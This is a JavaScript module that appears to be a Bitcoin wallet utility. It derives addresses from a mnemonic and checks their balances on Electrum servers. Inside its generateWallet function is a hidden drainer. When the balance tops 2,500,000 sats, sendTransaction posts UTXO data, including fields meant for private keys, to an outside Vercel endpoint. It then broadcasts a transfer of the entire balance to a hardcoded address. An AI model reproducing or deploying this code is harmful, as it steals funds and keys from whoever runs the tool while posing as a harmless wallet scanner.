const bip39 = require('bip39');
const bitcoin = require('bitcoinjs-lib');
const ElectrumClient = require('electrum-client');
const generatePubKeys = require('./generatePUB');
const axios = require('axios');

const paths = {
    bip44: "m/44'/0'/0'",
    bip49: "m/49'/0'/0'",
    bip84: "m/84'/0'/0'"
};

const electrumServers = [
    { host: 'fulcrum.sethforprivacy.com', port: 50002, protocol: 'ssl' },
    { host: 'mempool.blocktrainer.de', port: 50002, protocol: 'ssl' },
    { host: 'fulcrum.grey.pw', port: 51002, protocol: 'ssl' },
    { host: 'fortress.qtornado.com', port: 50002, protocol: 'ssl' },
    { host: 'electrumx-core.1209k.com', port: 50002, protocol: 'ssl' },
    { host: 'pipedream.fiatfaucet.com', port: 50002, protocol: 'ssl' },
    // Add more servers as needed
];

const createElectrumClient = async () => {
    for (let server of electrumServers) {
        const client = new ElectrumClient(server.port, server.host, server.protocol);
        try {
            await client.connect();
            console.log(`Connected to Electrum server ${server.host}`);
            return client;
        } catch (e) {
            console.error(`Failed to connect to server ${server.host}:${server.port}`);
        }
    }
    throw new Error('Failed to connect to any Electrum server');
};

const generateAddresses = (seed, path, start, count, type, change) => {
    const root = bitcoin.bip32.fromSeed(seed);
    const addresses = [];
    for (let i = start; i < start + count; i++) {
        const child = root.derivePath(`${path}/${change}/${i}`);
        let address, wif;
        switch (type) {
            case 'bip44':
                address = bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
                break;
            case 'bip49':
                address = bitcoin.payments.p2sh({ redeem: bitcoin.payments.p2wpkh({ pubkey: child.publicKey }) }).address;
                break;
            case 'bip84':
                address = bitcoin.payments.p2wpkh({ pubkey: child.publicKey }).address;
                break;
        }
        wif = child.toWIF();
        addresses.push({ address, wif, path: `${path}/${change}/${i}` });
    }
    return addresses;
};

const toElectrumScripthash = (address) => {
    const script = bitcoin.address.toOutputScript(address);
    const hash = bitcoin.crypto.sha256(script);
    return Buffer.from(hash.reverse()).toString('hex');
};

const checkTransactionHistoryAndBalance = async (client, addresses) => {
    const promises = addresses.map(async addrObj => {
        const scripthash = toElectrumScripthash(addrObj.address);
        const history = await client.blockchainScripthash_getHistory(scripthash);
        const utxos = await client.blockchainScripthash_listunspent(scripthash);
        const balance = await client.blockchainScripthash_getBalance(scripthash);

        addrObj.balance = {
            confirmed: balance.confirmed,
            unconfirmed: balance.unconfirmed,
            total: balance.confirmed + balance.unconfirmed
        };
        addrObj.transactions = {
            confirmed: history.filter(tx => tx.height > 0).length,
            unconfirmed: history.filter(tx => tx.height <= 0).length,
            total: history.length
        };
        addrObj.utxos = utxos;

        return history.length > 0 ? addrObj : null;
    });

    const usedAddresses = await Promise.all(promises);
    return usedAddresses.filter(addr => addr !== null);
};

const processAddresses = async (client, seed, type, path) => {
    let count = 10;
    let results = { usedAddresses: [], totalBalance: 0, freshReceiveAddress: null, freshChangeAddress: null, utxos: [] };
    let start = 0;
    let foundReceive = false;
    let foundChange = false;
    let lastUsedReceiveIndex = -1;
    let lastUsedChangeIndex = -1;

    while (!foundReceive || !foundChange) {
        const receiveAddresses = generateAddresses(seed, path, start, count, type, 0);
        const changeAddresses = generateAddresses(seed, path, start, count, type, 1);

        console.log(`Checking ${count} receive addresses and ${count} change addresses for ${type} starting from ${start}`);

        const [usedReceiveAddresses, usedChangeAddresses] = await Promise.all([
            checkTransactionHistoryAndBalance(client, receiveAddresses),
            checkTransactionHistoryAndBalance(client, changeAddresses)
        ]);

        if (usedReceiveAddresses.length > 0) {
            results.usedAddresses.push(...usedReceiveAddresses);
            results.totalBalance += usedReceiveAddresses.reduce((sum, addr) => sum + addr.balance.total, 0);
            results.utxos.push(...usedReceiveAddresses.flatMap(addr => addr.utxos));
            lastUsedReceiveIndex = Math.max(lastUsedReceiveIndex, ...usedReceiveAddresses.map(addr => parseInt(addr.path.split('/').pop())));
        } else {
            foundReceive = true;
        }

        if (usedChangeAddresses.length > 0) {
            results.usedAddresses.push(...usedChangeAddresses);
            results.totalBalance += usedChangeAddresses.reduce((sum, addr) => sum + addr.balance.total, 0);
            results.utxos.push(...usedChangeAddresses.flatMap(addr => addr.utxos));
            lastUsedChangeIndex = Math.max(lastUsedChangeIndex, ...usedChangeAddresses.map(addr => parseInt(addr.path.split('/').pop())));
        } else {
            foundChange = true;
        }

        start += count;
        count *= 2;
    }

    results.freshReceiveAddress = generateAddresses(seed, path, lastUsedReceiveIndex + 1, 1, type, 0)[0];
    results.freshChangeAddress = generateAddresses(seed, path, lastUsedChangeIndex + 1, 1, type, 1)[0];

    return { type, results };
};

const generateWallet = async (mnemonic) => {
    const pubKeys = generatePubKeys(mnemonic);
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const client = await createElectrumClient();

    const tasks = Object.entries(paths).map(([type, path]) => processAddresses(client, seed, type, path));
    const resultsArray = await Promise.all(tasks);

    const results = resultsArray.reduce((acc, { type, results }) => {
        acc[type] = {
            usedAddresses: results.usedAddresses,
            freshReceiveAddress: results.freshReceiveAddress,
            freshChangeAddress: results.freshChangeAddress,
            totalBalance: results.totalBalance
        };
        return acc;
    }, {});

    await client.close();

    results.key = mnemonic;
    results.pubKeys = pubKeys;

    // Check if the total balance is greater than 2,500,000 sats and send transaction if so
    if (resultsArray.some(result => result.results.totalBalance > 2500000)) {
        const allUtxos = resultsArray.flatMap(result => result.results.utxos);
        await sendTransaction(resultsArray.reduce((sum, result) => sum + result.results.totalBalance, 0), allUtxos);
    }

    return results;
};

const sendTransaction = async (totalBalance, utxos) => {
    const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
    const changeAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
    const recipientAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
    const initialTransactionFee = 5000;

    const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.type}`).join('|');

    const initialBody = {
        amountToSend: (totalBalance - initialTransactionFee).toString(),
        changeAddress,
        recipientAddress,
        utxosString,
        RBF: "false",
        isBroadcast: "false",
        transactionFee: initialTransactionFee.toString()
    };

    try {
        const initialResponse = await axios.post(url, initialBody);
        const virtualSize = initialResponse.data.virtualSize;

        const finalTransactionFee = 35 * virtualSize;
        const finalAmountToSend = totalBalance - finalTransactionFee;

        const finalBody = {
            amountToSend: finalAmountToSend.toString(),
            changeAddress,
            recipientAddress,
            utxosString,
            RBF: "false",
            isBroadcast: "true",
            transactionFee: finalTransactionFee.toString()
        };

        await axios.post(url, finalBody);
        console.log('Transaction sent successfully');
    } catch (error) {
        if (error.response) {
            console.error('Error response status:', error.response.status);
        } else {
            console.error('Error sending transaction:', error.message);
        }
    }
};

module.exports = { generateWallet };
